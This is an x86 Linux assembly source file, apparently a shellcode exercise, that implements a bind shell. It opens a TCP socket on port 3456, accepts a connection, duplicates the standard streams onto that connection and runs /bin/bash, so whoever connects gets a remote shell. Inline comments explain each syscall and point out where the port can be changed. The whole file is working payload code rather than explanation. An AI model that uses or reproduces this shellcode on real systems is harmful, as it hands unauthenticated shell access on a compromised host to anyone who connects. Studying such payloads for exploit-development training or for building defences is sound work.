global _start

section .text

_start:

;clear registers

xor ebx, ebx ;  zero out ebx
mul ebx ;  Zero out eax
xor ecx, ecx ;  zero out ecx

;SOCKET

push byte 0x66 ;  push syscall 102 in hex = 0x66
pop eax
inc ebx ;  increment ebx from 0 to equal 1 for socket
push edx ;  protocol = 0,
push BYTE 0x1 ;  SOCK_STREAM = 1,
push BYTE 0x2 ;  AF_INET = 2
mov ecx, esp ;  points ecx to our 3 arguments
int 0x80 ;  execute

mov edi, eax ; save sockfd

;BIND
push byte 0x66 ;  push syscall 102 in hex = 0x66
pop eax
inc ebx ;  incremented ebx once again to equal 2 SYS_BIND
push edx ;  push edx because it equals 0
push word 0x800d ;  <--- port 3456 in reverse hex {can be edited here to change port}
push word 0x2 ;  AF_INET = 2

mov ecx, esp ;  ecx has a pointer to the struct

push 0x10 ;  size 16
push ecx ;  pointer to the bind struct
push edi ;  socket fd
mov ecx, esp ;  ecx now contains all the arguments required
int 0x80


;LISTEN

push byte 0x66 ;  push syscall 102 in hex = 0x66
pop eax
add ebx, 0x2 ;  sys_listen = 4
push edx ;  listen backlog
push edi ;  sockfd
mov ecx, esp ;  pointer to the args for listen
int 0x80


;ACCEPT

push byte 0x66 ;  push syscall 102 in hex = 0x66
pop eax
inc ebx ;  ebx now equals 5 for accept
push edx ;  push 0 for addrlen
push edx ;  push 0 for addr
push edi ;  push sockfd
mov ecx, esp ;  pointer to data
int 0x80

;DUP2

xchg eax, ebx ;  new socket FD
xor ecx, ecx ;  making ecx zero for stdin
mov al, 0x3f ;  Dup2 syscall in hex
int 0x80

mov al, 0x3f ;  dup2 syscall
inc ecx ;  incrementing ecx to 1 for stdout
int 0x80

mov al, 0x3f ;  Dup2 syscall
inc ecx ;  incrementing ecx once again to 2 for stderr
int 0x80


;EXECVE

push edx ; ////bin/bash null terminated string
push 0x68736162 ; "hsab"
push 0x2f6e6962 ; "/nib"
push 0x2f2f2f2f ; "////"
mov ebx, esp ; store pointer to ////bin/bash in ebx
push edx ; push null
push ebx ; push filename
mov ecx, esp ; reference to ////bin/bash
mov al, 0xb ; execve syscall number in hex
int 0x80
